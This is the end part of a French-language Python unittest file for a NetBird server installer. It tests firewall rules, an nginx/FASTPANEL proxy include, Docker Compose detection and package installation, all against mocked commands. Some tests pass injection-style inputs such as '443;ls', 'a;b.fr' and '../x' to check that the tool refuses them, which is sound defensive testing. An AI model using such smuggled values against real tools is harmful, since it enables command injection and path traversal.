        self.assertEqual((r["ouverts_par_nous"], r["deja_ouverts"]), (["3478/udp"], ["443/tcp"]))
        self.assertEqual([c for c in self.cmds if c[:2] == ["ufw", "allow"]], [["ufw", "allow", "3478/udp", "comment", "NetBird (Cassandra)"]])
        self.cmds.clear()
        r = self.lance("pare_feu_ouvrir", "traefik")
        self.assertEqual(r["ouverts_par_nous"], ["80/tcp", "3478/udp"], "avec traefik, le 80 sert aux certificats")

    def test_ouvrir_refuse_un_pare_feu_inactif_inconnu_ou_un_proxy_inconnu(self):
        self.ufw = True
        self.sorties["ufw status"] = (0, "Status: inactive")
        self.assertIn("inactif", self.lance("pare_feu_ouvrir", "nginx")["erreur"])
        for argv in (("pare_feu_ouvrir",), ("pare_feu_ouvrir", "apache"), ("pare_feu_ouvrir", "nginx", "x")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.ufw = False
        self.assertIn("aucun pare-feu", self.lance("pare_feu_ouvrir", "nginx")["erreur"])
        self.assertFalse([c for c in self.cmds if c[:2] == ["ufw", "allow"]])

    def test_une_regle_refusee_arrete_l_ouverture_en_disant_ce_qui_est_deja_fait(self):
        self.ufw = True
        self.sorties["ufw status"] = (0, "Status: active")
        self.sorties["ufw allow 443/tcp"] = (0, "Rule added")
        self.sorties["ufw allow 3478/udp"] = (1, "ERROR: bad rule")
        r = self.lance("pare_feu_ouvrir", "nginx")
        self.assertFalse(r["ok"])
        self.assertEqual(r["ouverts_par_nous"], ["443/tcp"], "le retour sait quoi refermer")

    def test_fermer_ne_touche_qu_aux_ports_de_netbird(self):
        self.ufw = True
        self.assertTrue(self.lance("pare_feu_fermer", "3478/udp", "443/tcp")["ok"])
        self.assertEqual([c for c in self.cmds if c[:2] == ["ufw", "delete"]], [["ufw", "delete", "allow", "3478/udp"], ["ufw", "delete", "allow", "443/tcp"]])
        self.cmds.clear()
        for argv in (("pare_feu_fermer",), ("pare_feu_fermer", "22/tcp"), ("pare_feu_fermer", "443/tcp", "22/tcp"), ("pare_feu_fermer", "443;ls")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.assertFalse(self.cmds, "rien n'est lancé avant d'avoir tout vérifié")

    def test_firewalld_ouvre_en_permanent_puis_recharge(self):
        self.firewalld = True
        self.sorties["firewall-cmd --state"] = (0, "running")
        self.sorties["firewall-cmd --list-ports"] = (0, "")
        r = self.lance("pare_feu_ouvrir", "nginx")
        self.assertEqual(r["ouverts_par_nous"], ["443/tcp", "3478/udp"])
        self.assertEqual([c for c in self.cmds if "--permanent" in c], [["firewall-cmd", "--permanent", "--add-port=443/tcp"], ["firewall-cmd", "--permanent", "--add-port=3478/udp"]])
        self.assertIn(["firewall-cmd", "--reload"], self.cmds)


class ProxyFastpanel(Monde):
    def setUp(self):
        super().setUp()
        self.sites = Path(self.tmp.name) / "fastpanel2-sites"
        (self.sites / "fastuser").mkdir(parents=True)
        self.m.FASTPANEL_SITES = str(self.sites)
        self.inc = self.sites / "fastuser" / "netbird.exemple.fr.includes"
        self.inc.write_text("")
        self.sorties["nginx -v"] = (0, "nginx version: nginx/1.30.6")

    def test_publier_pose_les_trois_routes_teste_puis_recharge(self):
        r = self.lance("proxy_publier", "netbird.exemple.fr")
        self.assertTrue(r["ok"], r)
        t = self.inc.read_text()
        self.assertEqual(t.count(self.m.MARQUE_DEBUT), 1)
        for attendu in ("http2 on;", "location ~ ^/(relay|ws-proxy/) {", "grpc_pass grpc://127.0.0.1:8081;", "location ~ ^/(api|oauth2)/ {", "ManagementService)/"):
            self.assertIn(attendu, t, attendu)
        self.assertNotIn("proxy_pass http://127.0.0.1:8080", t, "le tableau de bord reste servi par le site")
        cmds = [" ".join(c) for c in self.cmds if c[0] in ("nginx", "systemctl") and c[1] != "-v"]
        self.assertEqual(cmds, ["nginx -t", "systemctl reload nginx"], "tester AVANT de recharger")

    def test_un_vieux_nginx_ne_recoit_pas_http2_on(self):
        self.sorties["nginx -v"] = (0, "nginx version: nginx/1.18.0")
        r = self.lance("proxy_publier", "netbird.exemple.fr")
        self.assertTrue(r["ok"] and not r["http2"])
        self.assertNotIn("http2 on;", self.inc.read_text())

    def test_ce_que_l_utilisateur_y_a_mis_reste_et_republier_ne_double_pas(self):
        self.inc.write_text("# mon réglage\nclient_max_body_size 50m;\n")
        self.lance("proxy_publier", "netbird.exemple.fr")
        self.lance("proxy_publier", "netbird.exemple.fr")
        t = self.inc.read_text()
        self.assertEqual(t.count(self.m.MARQUE_DEBUT), 1)
        self.assertIn("client_max_body_size 50m;", t)
        self.assertTrue(self.lance("proxy_etat", "netbird.exemple.fr")["deja"])
        self.assertTrue(self.lance("proxy_retirer", "netbird.exemple.fr")["retire"])
        t = self.inc.read_text()
        self.assertEqual(t, "# mon réglage\nclient_max_body_size 50m;\n", "après le retrait, exactement ce qu'il y avait")
        self.assertFalse(self.lance("proxy_retirer", "netbird.exemple.fr")["retire"], "rien à retirer la seconde fois")

    def test_un_refus_de_nginx_remet_l_ancien_contenu_sans_recharger(self):
        self.inc.write_text("# avant\n")
        self.sorties["nginx -t"] = (1, "nginx: [emerg] unknown directive")
        r = self.lance("proxy_publier", "netbird.exemple.fr")
        self.assertFalse(r["ok"])
        self.assertIn("unknown directive", r["erreur"])
        self.assertEqual(self.inc.read_text(), "# avant\n", "l'ancien contenu est remis")
        self.assertFalse([c for c in self.cmds if c[:2] == ["systemctl", "reload"]], "rien n'est rechargé")

    def test_un_domaine_qui_n_est_pas_un_site_fastpanel_ou_illisible_est_refuse(self):
        self.assertIn("pas un site FASTPANEL", self.lance("proxy_publier", "autre.exemple.fr")["erreur"])
        for argv in (("proxy_publier",), ("proxy_publier", "pas un domaine"), ("proxy_publier", "../x"), ("proxy_publier", "a.fr", "b.fr"), ("proxy_etat",), ("proxy_retirer", "a;b.fr")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.assertFalse([c for c in self.cmds if c[0] == "systemctl"])

    def test_un_lien_a_la_place_du_fichier_est_refuse(self):
        cible = Path(self.tmp.name) / "ailleurs"
        cible.write_text("")
        self.inc.unlink()
        try:
            os.symlink(cible, self.inc)
        except (OSError, NotImplementedError):
            self.skipTest("liens symboliques indisponibles ici")
        self.assertIn("pas un site FASTPANEL", self.lance("proxy_publier", "netbird.exemple.fr")["erreur"])
        self.assertEqual(cible.read_text(), "")

    def test_etat_du_proxy(self):
        r = self.lance("proxy_etat", "netbird.exemple.fr")
        self.assertEqual((r["fastpanel"], r["deja"], r["nginx"], r["http2"]), (True, False, "1.30.6", True))
        r = self.lance("proxy_etat", "inconnu.exemple.fr")
        self.assertEqual((r["fastpanel"], r["include"]), (False, ""))


class Compose(Monde):
    ARGS = ("installer", "v0.40.0", SHA, "netbird.exemple.fr", "admin@exemple.fr")
    def test_sans_aucun_compose_l_installation_est_refusee_avant_de_toucher_a_quoi_que_ce_soit(self):
        self.telecharge()
        self.plugin.unlink()
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("Docker Compose", r["erreur"])
        self.assertFalse(self.cmds, "rien n'est lancé")
        self.assertFalse(Path(self.dossier, "cassandra.json").exists(), "pas de pile à moitié posée : la marque n'est pas écrite")
        self.assertFalse(self.lance("etat")["compose"])

    def test_l_etat_se_rend_meme_sans_compose_quand_un_serveur_est_pose(self):
        self.poser()
        self.plugin.unlink()
        r = self.lance("etat")
        self.assertTrue(r["ok"], r)
        self.assertEqual((r["installe"], r["compose"], r["conteneurs"]), (True, False, []))
        self.assertEqual(self.lance("commande", "restart")["erreur"], "Docker Compose n'est pas installé sur cette machine")

    def test_l_ancien_docker_compose_sert_quand_le_greffon_manque(self):
        self.plugin.unlink()
        self.legacy = True
        self.assertTrue(self.lance("etat")["compose"])
        self.poser()
        self.assertTrue(self.lance("commande", "restart")["ok"])
        self.assertEqual(self.cmds[-1][:3], ["docker-compose", "-f", os.path.join(self.dossier, "docker-compose.yml")])

    def test_avec_l_ancien_compose_les_conteneurs_se_lisent_par_docker_ps(self):
        # trouvé sur argos : docker-compose 1.x n'a pas `ps --format json`, la liste restait vide et l'installation était annulée faute de preuve
        self.plugin.unlink()
        self.legacy = True
        self.poser()
        ligne = lambda nom, etat, ports: json.dumps({"Names": "netbird-" + nom + "-1", "Image": "netbirdio/" + nom + ":latest", "State": etat, "Ports": ports, "Labels": "com.docker.compose.project=x,com.docker.compose.service=" + nom + ",org.opencontainers.image.description=un, deux"})
        self.sorties["docker ps -a --filter label=com.docker.compose.project.working_dir=" + self.dossier] = (0, ligne("netbird-server", "running", "127.0.0.1:8081->80/tcp, 0.0.0.0:3478->3478/udp") + chr(10) + ligne("dashboard", "exited", "80/tcp"))
        r = self.lance("etat")
        self.assertEqual([(c["service"], c["etat"]) for c in r["conteneurs"]], [("netbird-server", "running"), ("dashboard", "exited")])
        self.assertEqual(r["conteneurs"][0]["ports"], ["0.0.0.0:3478->3478/udp", "127.0.0.1:8081->80/tcp"])
        self.assertEqual(r["conteneurs"][1]["ports"], [], "80/tcp seul n'est pas publié")
        self.assertFalse([c for c in self.cmds if c[:3] == ["docker-compose", "-f", os.path.join(self.dossier, "docker-compose.yml")] and "ps" in c], "jamais `docker-compose ps --format`")

    def test_avec_l_ancien_compose_la_sauvegarde_trouve_les_conteneurs_par_docker_ps(self):
        vol = monde_pile(self)
        self.plugin.unlink()
        self.legacy = True
        self.sorties["docker ps -a -q --filter label=com.docker.compose.project.working_dir=" + self.dossier] = (0, "abc123def456")
        self.sorties["docker ps -a --filter label=com.docker.compose.project.working_dir=" + self.dossier] = (0, json.dumps({"Names": "s", "Image": "i", "State": "running", "Ports": "", "Labels": ""}))
        r = self.lance("sauvegarder")
        self.assertTrue(r["ok"] and r["volumes"] == 1, r)

    def test_le_greffon_est_prefere_a_l_ancien_binaire(self):
        self.legacy = True
        self.poser()
        self.lance("commande", "restart")
        self.assertEqual(self.cmds[-1][:3], ["docker", "compose", "-f"])

    def test_installer_compose_prend_le_premier_paquet_que_la_distribution_offre(self):
        self.plugin.unlink()
        self.sorties["apt-cache policy docker-compose-plugin"] = (0, "docker-compose-plugin:\n  Installed: (none)\n  Candidate: (none)")
        self.sorties["apt-cache policy docker-compose-v2"] = (0, "")
        self.sorties["apt-cache policy docker-compose"] = (0, "docker-compose:\n  Installed: (none)\n  Candidate: 1.29.2-3")

        def apres_installation(commande, **kw):
            if commande[:3] == ["apt-get", "install", "-y"]:
                self.legacy = True
            return self.faux(commande, **kw)
        self.m.executer = apres_installation
        r = self.lance("installer_compose")
        self.assertTrue(r["ok"], r)
        self.assertEqual(r["commande"], "docker-compose")
        self.assertEqual([c for c in self.cmds if c[0] == "apt-get"], [["apt-get", "update"], ["apt-get", "install", "-y", "docker-compose"]])

    def test_installer_compose_refus_et_echecs(self):
        self.assertIn("déjà installé", self.lance("installer_compose")["erreur"])
        self.plugin.unlink()
        self.sorties["apt-cache policy"] = (0, "x:\n  Candidate: (none)")
        self.assertIn("aucun paquet Docker Compose", self.lance("installer_compose")["erreur"])
        self.docker = False
        self.assertIn("Docker n'est pas installé", self.lance("installer_compose")["erreur"])
        self.assertFalse(self.lance("installer_compose", "x")["ok"])
        self.assertFalse([c for c in self.cmds if c[:2] == ["apt-get", "install"]])

    def test_un_paquet_installe_mais_sans_compose_est_signale(self):
        self.plugin.unlink()
        self.sorties["apt-cache policy"] = (0, "p:\n  Candidate: 1.0")
        r = self.lance("installer_compose")
        self.assertFalse(r["ok"])
        self.assertIn("reste introuvable", r["erreur"])


class InstallerJq(Monde):
    def setUp(self):
        super().setUp()
        self.jq = False

    def test_apt_met_a_jour_l_index_puis_installe_jq_sans_question(self):
        r = self.lance("installer_jq")
        self.assertTrue(r["ok"], r)
        self.assertEqual(self.cmds, [["apt-get", "update"], ["apt-get", "install", "-y", "jq"]])
        self.assertEqual(self.envs[1]["DEBIAN_FRONTEND"], "noninteractive")

    def test_dnf_puis_yum(self):
        self.paquets = "dnf"
        self.assertTrue(self.lance("installer_jq")["ok"])
        self.assertEqual(self.cmds, [["dnf", "install", "-y", "jq"]])
        self.cmds.clear()
        self.paquets = "yum"
        self.lance("installer_jq")
        self.assertEqual(self.cmds, [["yum", "install", "-y", "jq"]])

    def test_refus_si_deja_la_si_aucun_gestionnaire_ou_un_argument(self):
        self.jq = True
        self.assertIn("déjà installé", self.lance("installer_jq")["erreur"])
        self.jq, self.paquets = False, ""
        self.assertIn("aucun gestionnaire", self.lance("installer_jq")["erreur"])
        self.assertFalse(self.lance("installer_jq", "x")["ok"])
        self.assertFalse(self.cmds)

    def test_un_echec_du_gestionnaire_est_rendu_et_arrete_la_suite(self):
        self.sorties["apt-get update"] = (100, "Err: dépôt injoignable")
        r = self.lance("installer_jq")
        self.assertFalse(r["ok"])
        self.assertIn("injoignable", r["sortie"])
        self.assertEqual(self.cmds, [["apt-get", "update"]], "pas d'installation si l'index n'a pas pu être mis à jour")


class Adresse(Monde):
    def test_ip_dit_si_l_adresse_est_privee(self):
        self.m.ip_sortante = lambda: "93.184.216.34"
        self.assertEqual(self.lance("ip"), {"ok": True, "ip": "93.184.216.34", "privee": False})
        self.m.ip_sortante = lambda: "192.168.1.20"
        self.assertTrue(self.lance("ip")["privee"])
        self.assertFalse(self.lance("ip", "x")["ok"])



if __name__ == "__main__":
    unittest.main()
# ▲▲▲ FIN BORNE CN ▲▲▲

# ═══ EXPLICATIF CN / EC ═══════════════════════════════════════════════════════
# CN : tout ce fichier est du nexus : charger, Monde, Refus, Telecharger, Installer, Exploitation
# EC : néant (aucun point d'évolution déclaré pour l'instant)
# LIEN : à compléter (contrat, fichiers voisins)
